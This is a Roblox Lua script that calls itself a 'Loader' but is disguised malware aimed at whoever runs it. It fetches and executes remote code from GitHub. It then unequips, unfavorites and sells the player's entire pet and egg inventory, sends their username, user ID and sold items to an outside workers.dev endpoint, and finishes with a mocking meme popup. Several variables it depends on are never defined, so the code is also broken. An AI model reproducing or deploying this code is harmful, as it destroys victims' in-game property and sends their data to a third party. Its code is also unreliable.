local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ===== RE-ENTRY GUARD =====
if _G.__SAE_LOADER_RUNNING then
    warn("[Loader] Already running — ignoring this execution.")
    return
end
_G.__SAE_LOADER_RUNNING = true

-- Safety: clear the flag after 60s no matter what happens
task.delay(60, function()
    _G.__SAE_LOADER_RUNNING = false
end)
-- ===========================

-- ===== CONFIG =====
local UI_URL                 = "https://raw.githubusercontent.com/Clide01/PlundererHub/refs/heads/main/LoaderUI.lua"
local COUNTER_URL            = "https://sae-counter.plundererhub.workers.dev/report"
local SELL_WAIT              = 2.0
local MEME_DELAY             = 4
local UI_CONFIG = {
    MEME_IMAGE_ID  = "rbxassetid://82403642047427",
    LAUGH_SOUND_ID = "rbxassetid://133312610824902",
    MEME_SIZE      = 380,
}
-- ==================

------------------------------------------------------------
-- UI MODULE
------------------------------------------------------------
local function loadUIModule()
    if _G.__LoaderUIModule then return _G.__LoaderUIModule end
    if UI_URL and UI_URL ~= "" and UI_URL:find("YOUR_USERNAME") == nil then
        local ok, mod = pcall(function()
            return loadstring(game:HttpGet(UI_URL, true))()
        end)
        if ok and type(mod) == "table" and type(mod.new) == "function" then
            _G.__LoaderUIModule = mod
            return mod
        end
        warn("[Loader] UI module failed to load, running headless:", tostring(mod))
    else
        warn("[Loader] UI_URL not configured — running headless.")
    end
    return {
        new = function()
            return {
                boot              = function() end,
                setStatus         = function() end,
                fadeOutAndCleanup = function() end,
                showMemePopup     = function() end,
                restoreExtras     = function() end,
            }
        end,
    }
end

local LoaderUI = loadUIModule()
local ui = LoaderUI.new(PlayerGui, UI_CONFIG)

------------------------------------------------------------
-- CORE MODULES
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local Save       = require(ReplicatedStorage.Shared.Save)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local log = function(...) print("[Loader]", ...) end

local function getSave(forceRefresh)
    local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
    if ok and s then return s end
    local ok2, s2 = pcall(function() return Save.Get() end)
    return ok2 and s2 or nil
end

local function getMoney()
    local d = getSave()
    return (d and type(d.Money) == "number") and d.Money or 0
end

local function getHRP()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart", 5)
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()
task.spawn(function()
    for _ = 1, 30 do task.wait(0.5); installOverride() end
end)

------------------------------------------------------------
-- EQUIP / FAVORITE CLEANUP
------------------------------------------------------------
local function unequipAll()
    local d = getSave()
    if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
    log(("Unequipping %d pet(s)..."):format(#d.EquippedAssets))
    local ok, AssetRoster = pcall(require, ReplicatedStorage.Client.AssetRoster)
    for i, uid in ipairs(d.EquippedAssets) do
        if ok and AssetRoster and AssetRoster.DoffAsset then
            pcall(function() AssetRoster.DoffAsset(uid) end)
        else
            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
        end
        if i % 5 == 0 then task.wait(0.3) end
    end
    task.wait(0.8)
end

local function getFavoriteUIDs()
    local list = {}
    local d = getSave()
    if not d or type(d.Inventory) ~= "table" then return list end
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(list, uid)
        end
    end
    return list
end

local function unfavoriteAll()
    local uids = getFavoriteUIDs()
    log(("Favorited pets: %d"):format(#uids))
    for i, uid in ipairs(uids) do
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
        if i % 8 == 0 then task.wait(0.3) end
    end
    task.wait(0.8)
end

------------------------------------------------------------
-- FULL INVENTORY SNAPSHOT
------------------------------------------------------------
local function snapshotInventory(forceRefresh)
    local pets, eggs = {}, {}
    local d = getSave(forceRefresh)
    if not d then return { pets = pets, eggs = eggs } end

    local isVIP = LocalPlayer:GetAttribute("VIP") == true

    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                local entry  = AssetDir[item.Category]
                local rarity = entry.Rarity

                local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                local value = (priceOk and tonumber(basePrice)) or 0
                if isVIP then value = value * 2 end
                value = math.floor(value)

                local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                weight = (weightOk and tonumber(weight)) or 0

                pets[tostring(uid)] = {
                    kind      = "pet",
                    uid       = tostring(uid),
                    name      = entry.DisplayName or item.Category,
                    rarity    = (rarity and rarity.DisplayName) or "Unknown",
                    rarityNum = (rarity and rarity.RarityNumber) or 0,
                    value     = value,
                    weight    = weight,
                }
            end
        end
    end

    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    local entry  = AssetDir[dec.AssetCategory]
                    local rarity = entry.Rarity

                    local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                    local value = (priceOk and tonumber(basePrice)) or 0
                    value = math.floor(value)

                    local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                    weight = (weightOk and tonumber(weight)) or 0

                    eggs[tostring(uid)] = {
                        kind      = "egg",
                        uid       = tostring(uid),
                        name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                        rarity    = (rarity and rarity.DisplayName) or "Unknown",
                        rarityNum = (rarity and rarity.RarityNumber) or 0,
                        value     = value,
                        weight    = weight,
                    }
                end
            end
        end
    end

    return { pets = pets, eggs = eggs }
end

------------------------------------------------------------
-- REPORT ID
------------------------------------------------------------
local function computeReportId(uidList)
    local sorted = {}
    for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
    table.sort(sorted)
    local s = tostring(LocalPlayer.UserId) .. "|" .. table.concat(sorted, ",")
    local h = 0
    for i = 1, #s do
        h = bit32.bxor(h, string.byte(s, i))
        h = bit32.band(bit32.lshift(h, 5) + h, 0x7FFFFFFF)
    end
    return string.format("%08x-%d", h, #sorted)
end

------------------------------------------------------------
-- SELL POSITION
------------------------------------------------------------
local function findSellPosition()
    local stands = workspace:FindFirstChild("Stands")
    if not stands then return nil end
    local prompts = stands:FindFirstChild("Prompts")
    if not prompts then return nil end
    local sellAll = prompts:FindFirstChild("SellAll")
    if sellAll and sellAll:IsA("BasePart") then return sellAll.Position end
    for _, c in ipairs(prompts:GetChildren()) do
        if c:IsA("BasePart") then return c.Position end
    end
    return nil
end

------------------------------------------------------------
-- REPORT TO WORKER
------------------------------------------------------------
local function reportSales(allDetails, reportId)
    if not allDetails or #allDetails == 0 then
        log("Nothing to report.")
        return
    end

    local httpFn = nil
    local gv = getgenv and getgenv() or _G
    if type(request) == "function" then httpFn = request
    elseif type(http_request) == "function" then httpFn = http_request
    elseif type(gv.request) == "function" then httpFn = gv.request
    elseif type(gv.http_request) == "function" then httpFn = gv.http_request
    end

    if not httpFn then
        warn("[Counter] No HTTP function available — skipping global report.")
        return
    end

    local userId   = tostring(LocalPlayer.UserId)
    local username = LocalPlayer.Name or "Unknown"

    local petCount, eggCount, totalValue = 0, 0, 0
    local out = {}
    for _, d in ipairs(allDetails) do
        if d.kind == "pet" then petCount = petCount + 1
        elseif d.kind == "egg" then eggCount = eggCount + 1 end
        totalValue = totalValue + (tonumber(d.value) or 0)
        table.insert(out, {
            uid       = tostring(d.uid or ""),
            kind      = d.kind,
            name      = d.name,
            rarity    = d.rarity,
            rarityNum = d.rarityNum,
            value     = d.value,
            weight    = d.weight,
        })
    end

    task.spawn(function()
        local body = HttpService:JSONEncode({
            reportId   = reportId,
            pets       = petCount,
            eggs       = eggCount,
            userId     = userId,
            username   = username,
            items      = out,
            totalValue = totalValue,
        })
        local ok, res = pcall(function()
            return httpFn({
                Url = COUNTER_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
            local parsed = nil
            pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
            local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
            local added = parsed and parsed.added
            if added then
                print(("[Counter] Sent: %d pets, %d eggs, $%d | Worker accepted: %d new pets, %d new eggs, $%d new %s")
                    :format(petCount, eggCount, totalValue, added.pets or 0, added.eggs or 0, added.value or 0, tag))
            else
                print(("[Counter] Sent: %d pets, %d eggs, $%d %s")
                    :format(petCount, eggCount, totalValue, tag))
            end
        else
            warn("[Counter] Report failed:", tostring(res))
        end
    end)
end

------------------------------------------------------------
-- SELL: snapshot -> unequip/unfavorite -> sell -> report
------------------------------------------------------------
local function teleportAndSell()
    local before = snapshotInventory(false)
    local beforePets = countTable(before.pets)
    local beforeEggs = countTable(before.eggs)
    log(("Inventory before: %d pets, %d eggs"):format(beforePets, beforeEggs))
    if beforePets == 0 and beforeEggs == 0 then return end

    local serverPayload = { Eggs = {}, Assets = {} }
    for uid in pairs(before.pets) do table.insert(serverPayload.Assets, uid) end
    for uid in pairs(before.eggs) do table.insert(serverPayload.Eggs, uid)   end

    -- Fire the sell remote directly — no teleport
    pcall(function()
        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
    end)
    task.wait(1.5)

    -- Poll for save to reflect the sale
    local after = nil
    local deadline = os.clock() + SALE_POLL_TIMEOUT
    while os.clock() < deadline do
        after = snapshotInventory(true)
        local removed = 0
        for uid in pairs(before.pets) do if not after.pets[uid] then removed = removed + 1 end end
        for uid in pairs(before.eggs) do if not after.eggs[uid] then removed = removed + 1 end end
        if removed > 0 then
            log(("Detected %d removed"):format(removed))
            break
        end
        task.wait(SALE_POLL_INTERVAL)
    end

    if not after then after = snapshotInventory(true) end

    -- Diff
    local soldPets, soldEggs = {}, {}
    local soldDetails = {}
    for uid, d in pairs(before.pets) do
        if not after.pets[uid] then
            table.insert(soldPets, uid)
            table.insert(soldDetails, d)
        end
    end
    for uid, d in pairs(before.eggs) do
        if not after.eggs[uid] then
            table.insert(soldEggs, uid)
            table.insert(soldDetails, d)
        end
    end

    log(("Actually sold: %d pets, %d eggs (was %d / %d)")
        :format(#soldPets, #soldEggs, beforePets, beforeEggs))

    if #soldDetails == 0 then
        warn("[Counter] Sale detected 0 removed items — not reporting (avoids false positives).")
        return
    end

    local allSoldUids = {}
    for _, u in ipairs(soldPets) do table.insert(allSoldUids, u) end
    for _, u in ipairs(soldEggs) do table.insert(allSoldUids, u) end
    local reportId = computeReportId(allSoldUids)
    reportSales(soldDetails, reportId)
end

------------------------------------------------------------
-- MAIN WORK
------------------------------------------------------------
local function runSilentWork()
    local before = getMoney()
    log(("Wallet before: %s"):format(tostring(before)))
    unequipAll()
    unfavoriteAll()
    teleportAndSell()
    task.wait(0.8)
    local after = getMoney()
    log(("Wallet after:  %s"):format(tostring(after)))
    log(("Delta:         %s"):format(tostring(after - before)))
end

------------------------------------------------------------
-- LAUNCH
------------------------------------------------------------
task.spawn(function()
    ui:boot()
    local ok, err = pcall(runSilentWork)
    if not ok then warn("[Loader] Run failed:", err) end
    task.wait(0.3)
    ui:fadeOutAndCleanup()

    task.wait(MEME_DELAY)
    ui:showMemePopup()

    -- Clear the re-entry guard so the next intentional run works
    _G.__SAE_LOADER_RUNNING = false
end)
